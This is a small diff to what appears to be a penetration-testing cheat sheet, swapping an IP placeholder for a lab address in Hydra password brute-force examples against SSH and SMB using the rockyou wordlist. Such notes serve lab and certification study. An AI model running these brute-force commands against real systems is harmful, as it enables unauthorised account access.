@@ -220,7 +220,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 -t 4 ssh
 hydra -t 1 -V -f -l administrator -P [path to pass-wordlist] 10.10.10.11 smb
 ###### Example :
 ```
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.11 smb
 ```
 
 - ### Post Web Form
